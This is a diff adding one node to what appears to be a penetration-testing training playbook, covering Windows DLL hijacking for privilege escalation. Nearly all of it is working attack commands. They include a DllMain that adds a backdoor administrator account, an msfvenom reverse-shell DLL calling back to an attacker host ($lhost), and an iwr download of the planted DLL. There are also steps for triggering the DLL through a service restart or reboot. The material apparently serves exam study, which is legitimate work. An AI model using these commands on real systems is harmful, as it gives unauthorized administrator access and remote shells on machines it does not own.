@@ -1,0 +1,22 @@
+{
+  "id": "win_dll_hijack",
+  "phase": "WINDOWS",
+  "title": "DLL Hijacking",
+  "body": "Module 17.2.2: Service loads a DLL from a writable directory before System32. Plant a malicious DLL with the missing name. Procmon is your tool to find NAME NOT FOUND DLL loads.",
+  "cmd": "# ── DLL SEARCH ORDER (Windows) ───────────────────────\n# 1. Application directory  <- check this first\n# 2. System32\n# 3. System (SysWOW64)\n# 4. Windows directory\n# 5. Current directory\n# 6. PATH directories  <- often writable\n\n# ── STEP 1: FIND MISSING DLL (Procmon method) ─────────\n# Need GUI/RDP for Procmon\n# 1. Run Procmon64.exe as admin\n# 2. Filter: Process Name = target.exe\n# 3. Filter: Operation = CreateFile\n# 4. Filter: Result = NAME NOT FOUND\n# 5. Filter: Path ends with .dll\n# 6. Look for DLLs loaded from writable directories\n\n# ── STEP 2: CONFIRM WRITE ACCESS TO TARGET DIR ────────\n# Test write access:\necho \"test\" > \"C:Program FilesVulnApp\test.txt\"\ntype \"C:Program FilesVulnApp\test.txt\"\n\n# icacls check:\nicacls \"C:Program FilesVulnApp\"\n\n# ── STEP 3: CREATE MALICIOUS DLL (on Kali) ────────────\n# C++ DLL template — runs on DLL_PROCESS_ATTACH\n# #include <stdlib.h>\n# #include <windows.h>\n# BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID reserved) {\n#   switch(reason) {\n#     case DLL_PROCESS_ATTACH:\n#       system(\"net user hacker pass123! /add\");\n#       system(\"net localgroup administrators hacker /add\");\n#       break;\n#   }\n#   return TRUE;\n# }\n\n# Compile as DLL:\nx86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll\n\n# Or msfvenom:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o TextShaping.dll\n\n# ── STEP 4: PLANT THE DLL ─────────────────────────────\n# Transfer and place in application directory\niwr http://$lhost/TextShaping.dll -OutFile \"C:FileZillaFileZilla FTP ClientTextShaping.dll\"\n\n# ── STEP 5: TRIGGER ───────────────────────────────────\n# Option A: Restart the service\nsc stop VulnService\nsc start VulnService\n\n# Option B: Wait for privileged user to run the app\n# If a high-priv user runs the app it loads our DLL with their privileges\nnet user  # check periodically for new admin user\n\n# Option C: Reboot (if Auto service + SeShutdownPrivilege)\nshutdown /r /t 0\n\n# ── STEP 6: VERIFY ────────────────────────────────────\nnet user\nnet localgroup administrators\n\n# ── PATH DLL HIJACK ───────────────────────────────────\n# If a binary in PATH calls LoadLibrary(\"missing.dll\"):\n# Find writable PATH dirs\necho %PATH%\n# Drop DLL in first writable dir before System32",
+  "warn": "64-bit process needs 64-bit DLL — msfvenom defaults to 32-bit, use windows/x64 explicitly. The DLL runs with the privileges of whoever launches the application — wait for a high-priv user if needed.",
+  "choices": [
+    {
+      "label": "DLL loaded — got shell/new admin",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Cannot restart service — wait or reboot",
+      "next": "persistence"
+    },
+    {
+      "label": "No writable service dir — try unquoted path",
+      "next": "unquoted_service"
+    }
+  ]
+}
